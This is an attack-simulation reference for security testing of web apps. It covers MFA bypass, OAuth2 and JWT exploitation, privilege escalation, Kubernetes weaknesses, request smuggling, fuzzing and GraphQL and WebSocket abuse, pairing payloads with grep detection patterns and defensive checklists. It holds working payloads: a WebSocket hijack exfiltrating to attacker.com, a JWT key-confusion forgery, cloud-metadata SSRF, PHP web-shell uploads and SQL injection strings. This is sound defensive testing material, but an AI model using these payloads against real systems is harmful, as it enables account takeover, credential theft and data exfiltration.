# Advanced Attack Simulation Reference

## Table of Contents
1. [MFA Bypass Techniques](#mfa)
2. [OAuth2 Advanced Exploitation](#oauth2-adv)
3. [JWT Deep Exploitation](#jwt-deep)
4. [Session Persistence Attacks](#session-persist)
5. [Privilege Escalation Chains](#privesc)
6. [Microservices Attack Surface](#microservices)
7. [Container & Kubernetes Exploitation](#containers)
8. [Internal vs External Attack Simulation](#internal-external)
9. [Network Protocol Attacks](#network)
10. [Advanced Fuzzing Techniques](#adv-fuzzing)
11. [GraphQL Deep Exploitation](#graphql-deep)
12. [WebSocket Security](#websocket)

---

<a name="mfa"></a>
## 1. MFA Bypass Techniques

### Attack Vectors

**1.1 — Brute Force OTP/TOTP**
```
# If no rate limiting on MFA verification endpoint:
POST /api/auth/verify-mfa
{"code": "000000"}  → 401
{"code": "000001"}  → 401
...
{"code": "123456"}  → 200 (valid)

# Detection:
Grep: pattern="(verify.?mfa|verify.?otp|verify.?totp|check.?code|validate.?token)"
# Then verify: is there rate limiting? Account lockout after N failed attempts?
```

**1.2 — MFA Code Reuse**
```
# Test if the same code can be used multiple times:
POST /api/auth/verify-mfa {"code": "123456"} → 200
POST /api/auth/verify-mfa {"code": "123456"} → 200 (should be 401!)

# Detection:
Grep: pattern="(otp|totp|mfa.?code|verification.?code)"
# Verify: is the code invalidated after first use?
# Verify: does the code have a short TTL (30-60 seconds)?
```

**1.3 — MFA Skip via Direct Navigation**
```
# After entering username/password, skip MFA step:
POST /api/auth/login → {"requires_mfa": true, "temp_token": "abc"}
# Instead of verifying MFA, try accessing protected endpoints with temp_token:
GET /api/dashboard -H "Authorization: Bearer abc"
# If accessible → MFA can be bypassed entirely

# Detection:
Grep: pattern="(requires.?mfa|mfa.?required|two.?factor.?required|pending.?verification)"
# Verify: are intermediate auth tokens restricted to ONLY the MFA verification endpoint?
```

**1.4 — MFA via Backup Codes Weakness**
```
# Backup codes often have weaker controls:
# - No rate limiting on backup code verification
# - Backup codes not invalidated after use
# - Backup codes predictable (sequential, short)
# - Unlimited backup code generation

# Detection:
Grep: pattern="(backup.?code|recovery.?code|emergency.?code)"
# Verify: are backup codes single-use? Rate-limited? Cryptographically random?
```

**1.5 — MFA Enrollment Bypass**
```
# During account creation, MFA setup might be optional or skippable:
POST /api/auth/register {"email": "...", "password": "..."}
# Skip: POST /api/auth/setup-mfa
# Go directly to: GET /api/dashboard
# If accessible → users can create accounts without MFA

# Detection:
Grep: pattern="(setup.?mfa|enroll.?mfa|enable.?2fa|register.?totp)"
# Verify: is MFA enrollment enforced server-side or only client-side?
```

### MFA Testing Checklist
- [ ] Rate limiting on OTP verification (max 3-5 attempts per window)
- [ ] Account lockout after excessive MFA failures
- [ ] OTP codes are single-use and time-limited
- [ ] Intermediate auth tokens cannot access protected resources
- [ ] Backup codes are cryptographically random and single-use
- [ ] MFA enrollment is enforced server-side (not just frontend redirect)
- [ ] MFA cannot be disabled without re-authentication
- [ ] MFA status cannot be modified via API parameter tampering

---

<a name="oauth2-adv"></a>
## 2. OAuth2 Advanced Exploitation

### 2.1 — Authorization Code Interception
```
# Intercept auth code via open redirect in redirect_uri:
https://auth.target.com/authorize?
  client_id=legit_app&
  redirect_uri=https://legit-app.com/callback/../../../attacker.com&
  response_type=code&
  scope=openid+profile+email

# Redirect URI bypass patterns:
redirect_uri=https://legit-app.com@attacker.com
redirect_uri=https://legit-app.com%40attacker.com
redirect_uri=https://legit-app.com.attacker.com
redirect_uri=https://attacker.com?redirect=https://legit-app.com
redirect_uri=https://legit-app.com/callback?next=//attacker.com
```

### 2.2 — Token Theft via Implicit Flow
```
# If app uses implicit flow (response_type=token):
# Token is in URL fragment: https://app.com/callback#access_token=xyz
# URL fragments are:
#   - Accessible to JavaScript on the page
#   - Logged by some analytics tools
#   - Visible in browser history
#   - Leaked via Referer header in some cases

# Detection:
Grep: pattern="response_type\s*=\s*[\"']?token"
Grep: pattern="(implicit|fragment|hash).*token"
# If found, recommend PKCE authorization code flow instead
```

### 2.3 — PKCE Downgrade Attack
```
# If server supports PKCE but doesn't require it:
# Attacker can omit code_challenge and code_verifier
# If the server accepts the authorization code without PKCE verification:
POST /token
  grant_type=authorization_code&
  code=STOLEN_CODE&
  client_id=app_id
  # No code_verifier — should be rejected!

# Detection:
Grep: pattern="(code_challenge|code_verifier|pkce)"
# Verify: is PKCE enforced or optional?
```

### 2.4 — Scope Escalation
```
# Request more scopes than authorized:
# Step 1: App requests scope=read
# Step 2: Modify token request to scope=read+write+admin
# Step 3: If token is issued with expanded scope → vulnerability

# Detection:
Grep: pattern="(scope|scopes|permission)"
# Verify: are requested scopes validated against registered app scopes?
```

### OAuth2 Advanced Checklist
- [ ] Redirect URI validated with exact match (no wildcards or subpaths)
- [ ] PKCE required for all public clients
- [ ] Implicit flow disabled
- [ ] Authorization codes are single-use and short-lived (<60s)
- [ ] Token scope validated against client registration
- [ ] Refresh token rotation enforced
- [ ] Token revocation endpoint exists and works
- [ ] CSRF protection via state parameter
- [ ] Client secret not embedded in frontend code

---

<a name="jwt-deep"></a>
## 3. JWT Deep Exploitation

### 3.1 — Key Confusion Attack (RS256 → HS256)
```python
# If server uses RS256 but accepts HS256:
# The public key (known to everyone) becomes the HMAC secret
import jwt

# Get the server's public key (often at /.well-known/jwks.json or /public-key)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
-----END PUBLIC KEY-----"""

# Sign with HS256 using the public key as secret
forged_token = jwt.encode(
    {"sub": "admin", "role": "superadmin", "exp": 9999999999},
    public_key,
    algorithm="HS256"
)
# If server verifies with: jwt.decode(token, public_key, algorithms=["HS256", "RS256"])
# The forged token will pass verification!
```

### 3.2 — JWK Header Injection
```json
// Inject attacker's public key in the JWT header:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
// If server trusts the JWK in the header for verification,
// attacker can sign with their own private key

// Detection:
// Grep: pattern="(jwk|jku|x5u|x5c).*header"
// Verify: does the server use embedded JWK from token header?
```

### 3.3 — JWT Claim Manipulation
```json
// Claims to test modifying:
{"sub": "admin"}                    // Change subject to admin user
{"role": "admin"}                   // Elevate role
{"is_admin": true}                  // Admin flag
{"exp": 9999999999}                 // Far-future expiration
{"iat": 0}                          // Issued-at in the past
{"aud": "internal-service"}         // Change audience to internal
{"iss": "trusted-issuer.com"}       // Spoof issuer
{"scope": "admin:all"}              // Expand scope
{"tenant_id": "other_tenant"}       // Cross-tenant access
```

### 3.4 — JWT Secret Brute Force
```bash
# If HS256 with weak secret:
# Common weak secrets to test:
# secret, password, 123456, changeme, your-256-bit-secret (default from jwt.io)
# key, test, jwt_secret, mysecret, s3cr3t

# Detection:
# Grep: pattern="(jwt.?secret|JWT_SECRET|token.?secret)\s*[:=]\s*[\"'][^\"']{1,20}[\"']"
# Short secrets (<32 chars) are brute-forceable
```

---

<a name="session-persist"></a>
## 4. Session Persistence Attacks

### 4.1 — Session Fixation
```
# Attack flow:
# 1. Attacker obtains a valid session ID (by visiting the login page)
# 2. Attacker sends the session ID to victim (via URL, hidden form, etc.)
# 3. Victim logs in — server associates the FIXED session ID with victim's account
# 4. Attacker uses the same session ID to access victim's account

# Detection:
Grep: pattern="(session.?id|sessionId|JSESSIONID|PHPSESSID|connect\.sid)"
# Verify: is session ID regenerated after login?
# Verify: are session IDs accepted from URL parameters?
```

### 4.2 — Session Hijacking via Token Persistence
```
# Long-lived sessions/tokens stored insecurely:
# - Tokens in localStorage (XSS accessible)
# - Session cookies without expiration (persistent across browser restarts)
# - Refresh tokens stored in the same location as access tokens

# Detection:
Grep: pattern="localStorage\.(setItem|getItem).*(?:token|session|auth|jwt)"
Grep: pattern="sessionStorage\.(setItem|getItem).*(?:token|session|auth|jwt)"
Grep: pattern="(maxAge|max-age|expires).*(?:year|365|31536000|forever|never)"
```

### 4.3 — Concurrent Session Abuse
```
# Test: can an attacker maintain access after victim changes password?
# Step 1: Login from device A (get session/token A)
# Step 2: Login from device B (get session/token B)
# Step 3: Change password from device B
# Step 4: Test if session/token A is still valid → should be invalidated!

# Detection:
Grep: pattern="(change.?password|reset.?password|update.?password)"
# Verify: does password change invalidate all other sessions?
```

### Session Testing Checklist
- [ ] Session ID regenerated on authentication
- [ ] Session ID regenerated on privilege escalation
- [ ] All sessions invalidated on password change
- [ ] Session timeout (idle + absolute) configured
- [ ] Concurrent session limiting (optional)
- [ ] Session data stored server-side (not in JWT payload or cookies)
- [ ] Secure cookie flags (HttpOnly, Secure, SameSite)
- [ ] Logout actually invalidates the session server-side

---

<a name="privesc"></a>
## 5. Privilege Escalation Chains

### 5.1 — Horizontal Privilege Escalation (IDOR)
```
# Systematic IDOR testing:
# For every endpoint that uses an ID:
GET /api/users/123/profile      → Change 123 to 124 (another user)
GET /api/orders/ORD-001         → Change to ORD-002
PUT /api/users/123/settings     → Change to 124
DELETE /api/documents/456       → Change to 457
GET /api/files/abc-def-123      → Enumerate UUIDs (harder but test anyway)

# Detection pattern:
Grep: pattern="(params\[.id.\]|params\.id|req\.params\.\w+Id|request\.args\.get\(.id)"
# Then trace: is there an ownership/authorization check after fetching?
```

### 5.2 — Vertical Privilege Escalation
```
# Test admin endpoints as regular user:
GET /api/admin/users            → 403? or data leak?
POST /api/admin/create-user     → 403? or user created?
PUT /api/admin/config           → 403? or config changed?
DELETE /api/admin/user/123      → 403? or user deleted?

# Role manipulation via request body:
POST /api/register {"email": "a@b.com", "password": "...", "role": "admin"}
PUT /api/profile {"name": "...", "role": "admin", "is_admin": true}

# Hidden admin parameter:
POST /api/action {"data": "...", "admin": true}
POST /api/action {"data": "...", "__admin": true}
POST /api/action {"data": "...", "debug": true}
```

### 5.3 — Multi-Step Escalation Chains
```
# Chain: Information Disclosure → Account Takeover → Admin Access
# Step 1: IDOR reveals admin user's email
GET /api/users/1 → {"email": "admin@company.com"}

# Step 2: Password reset for admin email
POST /api/auth/forgot-password {"email": "admin@company.com"}

# Step 3: Predictable reset token or token leak
GET /api/auth/reset-password?token=PREDICTED_TOKEN

# Step 4: Reset admin password, login as admin

# Chain: SSRF → Internal API → Database Credentials → Full Access
# Step 1: SSRF via webhook URL
POST /api/webhooks {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Step 2: Obtain cloud credentials
# Step 3: Access cloud secrets manager
# Step 4: Retrieve database credentials
# Step 5: Direct database access
```

### Privilege Escalation Checklist
- [ ] All endpoints verify authorization (not just authentication)
- [ ] Object-level authorization on every resource access
- [ ] Role cannot be set/modified via request parameters
- [ ] Admin endpoints separated and properly gated
- [ ] Function-level access control enforced server-side
- [ ] Mass assignment protection (explicit allowlists)
- [ ] No sequential/predictable resource IDs for sensitive resources
- [ ] Audit logging on all privilege-change operations

---

<a name="microservices"></a>
## 6. Microservices Attack Surface

### 6.1 — Service-to-Service Authentication
```
# Check: do internal services authenticate each other?
# Common weaknesses:
# - No authentication between services (trust based on network)
# - Shared static API key across all services
# - JWT from external user forwarded without re-validation

# Detection:
Grep: pattern="(internal.?api|service.?key|inter.?service|microservice)"
Grep: pattern="(X-Internal|X-Service|X-Forwarded-For)"
# Verify: can an attacker access internal service endpoints directly?
```

### 6.2 — API Gateway Bypass
```
# If API gateway handles auth, test direct service access:
# Gateway: https://api.target.com/users → auth required
# Direct:  http://users-service:8080/users → no auth?

# Headers that might bypass gateway:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### 6.3 — Service Mesh Security
```
# Detection:
Grep: pattern="(istio|envoy|linkerd|consul|service.?mesh)"
Glob: pattern="**/{istio,envoy,linkerd}*.{yaml,yml}"

# Check:
# - mTLS enforced between services?
# - Authorization policies defined?
# - Sidecar injection required?
# - Network policies limiting service communication?
```

### 6.4 — Event Bus / Message Queue Poisoning
```
# If services communicate via events (Kafka, RabbitMQ, SQS):
# Can an attacker inject malicious messages?
# Are messages validated/authenticated?
# Can message replay cause duplicate actions?

# Detection:
Grep: pattern="(kafka|rabbitmq|amqp|sqs|sns|pubsub|nats|redis.?pub)"
# Verify: message authentication, schema validation, idempotency
```

### Microservices Checklist
- [ ] Service-to-service authentication enforced (mTLS, JWT, or service tokens)
- [ ] API gateway cannot be bypassed (direct service access blocked)
- [ ] Each service validates authorization independently
- [ ] Message bus messages are authenticated and validated
- [ ] Network segmentation limits service communication paths
- [ ] Service discovery secured (not publicly accessible)
- [ ] Centralized logging and tracing for security events
- [ ] Circuit breakers prevent cascade failures
- [ ] Secrets managed centrally (not per-service config files)

---

<a name="containers"></a>
## 7. Container & Kubernetes Exploitation

### 7.1 — Container Escape Vectors
```
# Detection patterns:
Grep: pattern="privileged:\s*true"                    # Privileged container
Grep: pattern="/var/run/docker\.sock"                  # Docker socket mount
Grep: pattern="hostPID:\s*true"                        # Host PID namespace
Grep: pattern="hostNetwork:\s*true"                    # Host network namespace
Grep: pattern="hostIPC:\s*true"                        # Host IPC namespace
Grep: pattern="allowPrivilegeEscalation:\s*true"       # Priv escalation
Grep: pattern="capabilities:.*add:.*SYS_ADMIN"         # Dangerous capability
Grep: pattern="securityContext:" -A 10                  # Review context

# Each of these can potentially allow container escape:
# - Privileged: full host device access
# - Docker socket: can create containers on host
# - hostPID: can see/signal host processes
# - hostNetwork: bypass network isolation
# - SYS_ADMIN: mount filesystems, namespace manipulation
```

### 7.2 — Kubernetes RBAC Issues
```yaml
# Overly permissive ClusterRole:
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
rules:
- apiGroups: ["*"]      # All API groups
  resources: ["*"]      # All resources
  verbs: ["*"]          # All verbs — THIS IS cluster-admin!

# Detection:
Grep: pattern="ClusterRole|ClusterRoleBinding" glob="**/*.yaml"
Grep: pattern='resources:.*\["\*"\]' glob="**/*.yaml"
Grep: pattern='verbs:.*\["\*"\]' glob="**/*.yaml"

# Service Account Token Theft:
# If pod has default service account with broad permissions,
# attacker can read token from:
# /var/run/secrets/kubernetes.io/serviceaccount/token
# and use it to access the Kubernetes API
```

### 7.3 — Image Security
```
# Detection:
Grep: pattern="image:\s+\S+:latest"             # Unpinned image tags
Grep: pattern="image:\s+\S+(?!@sha256:)"        # No digest pinning
Grep: pattern="imagePullPolicy:\s*Never"         # Using local images only

# Check:
# - Are images from trusted registries?
# - Are images signed?
# - Do images have known CVEs? (use trivy, grype, etc.)
# - Are images minimal (distroless, alpine)?
```

### 7.4 — Network Policies
```yaml
# If no NetworkPolicy exists, all pods can communicate with all other pods
# Detection:
Glob: pattern="**/*network*policy*.yaml"
Grep: pattern="NetworkPolicy" glob="**/*.yaml"

# Minimum security: default deny all ingress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
spec:
  podSelector: {}       # Applies to all pods
  policyTypes:
  - Ingress             # Deny all ingress by default
```

### Container/K8s Checklist
- [ ] No privileged containers
- [ ] Docker socket not mounted
- [ ] Read-only root filesystem where possible
- [ ] Non-root user in containers
- [ ] Resource limits (CPU, memory) set
- [ ] Network policies restrict inter-pod traffic
- [ ] RBAC follows least-privilege principle
- [ ] Service account tokens auto-mount disabled where not needed
- [ ] Image tags pinned to digest or specific version
- [ ] Pod Security Standards enforced (restricted profile)
- [ ] Secrets not stored in environment variables (use Kubernetes Secrets or external vault)
- [ ] No host namespace sharing (PID, network, IPC)

---

<a name="internal-external"></a>
## 8. Internal vs External Attack Simulation

### External Attacker Perspective
```
# What can an unauthenticated external attacker see?
# 1. Public endpoints enumeration
# 2. Login/registration forms → credential attacks
# 3. Public API documentation (Swagger/OpenAPI)
# 4. Error pages revealing technology stack
# 5. HTTP headers revealing server software
# 6. Publicly accessible admin panels
# 7. Exposed development/staging environments
# 8. DNS records revealing internal infrastructure
# 9. Source code in public repositories
# 10. Leaked credentials in paste sites

# Detection:
Grep: pattern="(swagger|openapi|api-docs|graphiql|graphql.?playground)"
Grep: pattern="(admin|dashboard|manage|internal|staging|dev)\."
Grep: pattern="(Server:|X-Powered-By:|X-AspNet-Version:)"
```

### Internal Attacker Perspective (Authenticated User)
```
# What can an authenticated low-privilege user access?
# 1. Other users' data (IDOR)
# 2. Admin functionality (vertical escalation)
# 3. Internal APIs not meant for their role
# 4. Debug/diagnostic endpoints
# 5. File upload to execute code
# 6. Internal service endpoints via SSRF
# 7. Other tenants' data in multi-tenant apps
# 8. API endpoints missing from the UI but available

# Systematic test:
# For each endpoint in the API:
#   - Test as unauthenticated → should get 401
#   - Test as user role A → verify correct access
#   - Test as user role B → verify no unauthorized access
#   - Test with expired/revoked token → should get 401
#   - Test with token from different tenant → should get 403
```

### Insider Threat Simulation
```
# What can a compromised developer/admin do?
# 1. Access source code repositories
# 2. Access CI/CD pipelines (inject malicious code)
# 3. Access secrets management (extract all secrets)
# 4. Access production databases directly
# 5. Deploy malicious code to production
# 6. Modify access controls for persistence
# 7. Exfiltrate data via legitimate channels

# Detection:
Grep: pattern="(admin|root|superuser|super.?admin)"
# Verify: are admin actions audited? Is there separation of duties?
# Verify: can a single person deploy to production without review?
```

---

<a name="network"></a>
## 9. Network Protocol Attacks

### 9.1 — DNS Rebinding
```
# Attack: bypass same-origin policy and SSRF protections
# Step 1: Attacker controls a domain (attacker.com)
# Step 2: DNS for attacker.com first resolves to attacker's IP (passes validation)
# Step 3: DNS TTL expires, second lookup resolves to 127.0.0.1
# Step 4: Application makes request to "attacker.com" but it now reaches localhost

# Detection:
Grep: pattern="(dns|resolve|lookup|getaddrinfo)"
# Verify: is DNS resolution cached? Is there re-validation after redirect?
```

### 9.2 — HTTP Desync / Request Smuggling
```
# CL.TE smuggling (front-end uses Content-Length, back-end uses Transfer-Encoding):
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL smuggling (opposite):
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# Detection:
Grep: pattern="(proxy|reverse.?proxy|load.?balancer|nginx|apache|haproxy|cloudflare|cloudfront)"
# If there's a proxy + backend: test for parsing inconsistencies
```

### 9.3 — WebSocket Hijacking
```javascript
// Cross-Site WebSocket Hijacking (CSWSH):
// If WebSocket connection doesn't verify Origin header:
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(event) {
    // Attacker receives messages from victim's WebSocket
    fetch("https://attacker.com/log?data=" + event.data);
};

// Detection:
// Grep: pattern="(WebSocket|ws://|wss://|upgrade.*websocket|socket\.io)"
// Verify: is Origin header validated on WebSocket upgrade?
// Verify: is authentication required for WebSocket connections?
```

---

<a name="adv-fuzzing"></a>
## 10. Advanced Fuzzing Techniques

### 10.1 — Stateful API Fuzzing
```
# Fuzz operations that depend on previous state:
# Step 1: Create resource (POST /api/items)
# Step 2: Modify with fuzzed data (PUT /api/items/1)
# Step 3: Trigger action (POST /api/items/1/process)
# Step 4: Check for errors, crashes, unexpected behavior

# State machine fuzzing:
# Map valid state transitions:
#   created → paid → shipped → delivered
# Test invalid transitions:
#   created → delivered (skip payment!)
#   shipped → created (revert to unpaid!)
#   delivered → paid → refunded → shipped (logic error!)
```

### 10.2 — Context-Aware Payload Generation
```python
# Instead of generic payloads, generate context-specific ones:

# For email fields:
test_emails = [
    "a@a.com",                           # minimal valid
    "a" * 10000 + "@test.com",           # long local part
    "user+tag@test.com",                 # plus addressing
    "user@test.com\nBCC:attacker@evil",  # header injection
    "<script>alert(1)</script>@test.com", # XSS in email
    "admin@target.com",                   # privilege via email domain
    "user@127.0.0.1",                    # SSRF via email domain
    "user@[127.0.0.1]",                  # IP literal
]

# For file upload fields:
test_files = [
    ("test.php", "<?php phpinfo(); ?>"),          # PHP execution
    ("test.svg", "<svg onload=alert(1)>"),         # XSS via SVG
    ("../../../etc/passwd", "content"),             # path traversal in filename
    ("test.jpg.php", "<?php system($_GET['c']); ?>"),  # double extension
    ("test.php%00.jpg", "<?php phpinfo(); ?>"),    # null byte
    (".htaccess", "AddType application/x-httpd-php .txt"),  # config override
    ("test.html", "<script>document.location='http://evil/'</script>"),  # stored XSS
]

# For numeric ID fields:
test_ids = [
    0, -1, 1, 2, 999999999,            # boundaries
    "1 OR 1=1",                          # SQL injection
    "1; DROP TABLE users",               # SQL injection
    "../../../etc/passwd",               # path traversal
    "{{7*7}}",                           # template injection
    "${7*7}",                            # template injection
    "1\n2",                              # newline injection
]
```

### 10.3 — Protocol-Level Fuzzing
```
# HTTP method fuzzing:
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
           "HEAD", "TRACE", "CONNECT", "PROPFIND", "MKCOL"]
# Test each method on every endpoint

# Header fuzzing:
headers_to_fuzz = {
    "Content-Type": ["application/json", "application/xml", "text/html",
                     "application/x-www-form-urlencoded", "multipart/form-data",
                     "../../../etc/passwd"],
    "Accept": ["*/*", "application/json", "text/html"],
    "X-Forwarded-For": ["127.0.0.1", "10.0.0.1", "::1"],
    "X-Forwarded-Host": ["internal-admin.target.com"],
    "X-Original-URL": ["/admin"],
    "X-HTTP-Method-Override": ["PUT", "DELETE", "PATCH"],
    "Transfer-Encoding": ["chunked", "chunked, identity"],
}
```

### 10.4 — Mutation-Based Fuzzing
```
# Take valid input and mutate it systematically:
# 1. Bit flipping — flip random bits in binary data
# 2. Boundary insertion — insert max/min values at random positions
# 3. Format string insertion — %s, %x, %n at random positions
# 4. Special character insertion — null bytes, unicode, control chars
# 5. Repetition — repeat valid portions N times
# 6. Truncation — cut off at random points
# 7. Type swapping — replace string with int, array, object, null
# 8. Encoding variation — URL encode, double encode, unicode encode
```

---

<a name="graphql-deep"></a>
## 11. GraphQL Deep Exploitation

### 11.1 — Field Suggestion / Enumeration
```graphql
# Even with introspection disabled, field names can be leaked via suggestions:
{ user { passwor } }
# Error: "Cannot query field 'passwor'. Did you mean 'password'?"

# Automated enumeration via typos of common field names:
namee → name
emial → email
passwrod → password
phon → phone
addres → address
```

### 11.2 — Alias-Based Batching Attack
```graphql
# Bypass rate limiting with aliases (single request, multiple operations):
{
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
  # ... 1000 more aliases
}
# All executions happen in a single HTTP request
```

### 11.3 — Nested Query DoS
```graphql
# Calculate query cost to determine DoS potential:
{
  users(first: 100) {         # 100
    posts(first: 100) {       # 100 * 100 = 10,000
      comments(first: 100) {  # 100 * 100 * 100 = 1,000,000
        author {               # 1,000,000
          posts(first: 100) {  # 100,000,000 (!!)
            title
          }
        }
      }
    }
  }
}
# Without depth/cost limiting, this is a billion-row query
```

### 11.4 — Mutation Testing
```graphql
# Test mutations for authorization:
mutation {
  updateUser(id: "OTHER_USER_ID", input: { role: ADMIN }) {
    id
    role
  }
}

mutation {
  deleteUser(id: "ADMIN_USER_ID") {
    success
  }
}

# Test mutations for injection:
mutation {
  createPost(title: "test' OR '1'='1", body: "<script>alert(1)</script>") {
    id
  }
}
```

---

<a name="websocket"></a>
## 12. WebSocket Security

### Detection
```
Grep: pattern="(WebSocket|socket\.io|ws://|wss://|\.upgrade\(|\.on\('connection|\.on\('message)"
Grep: pattern="(io\.listen|io\.connect|new WebSocket|sockjs|stomp)"
```

### Attack Vectors
```
# 1. Missing authentication on WebSocket upgrade
# 2. No origin validation (CSWSH)
# 3. No message validation (injection via WebSocket messages)
# 4. No rate limiting on messages
# 5. Sensitive data in WebSocket messages without encryption
# 6. Missing authorization for WebSocket channels/rooms
# 7. Broadcast messages leaking data to unauthorized users

# Testing:
# - Connect without authentication → should be rejected
# - Connect with different Origin header → should be rejected
# - Send malformed messages → should be handled gracefully
# - Send messages to other users' channels → should be rejected
# - Send extremely fast messages → should be rate limited
```

### WebSocket Checklist
- [ ] Authentication required for WebSocket upgrade
- [ ] Origin header validated
- [ ] Messages validated and sanitized
- [ ] Authorization per channel/room
- [ ] Rate limiting on messages
- [ ] Secure transport (wss://)
- [ ] Graceful handling of malformed messages
- [ ] No sensitive data in broadcast messages
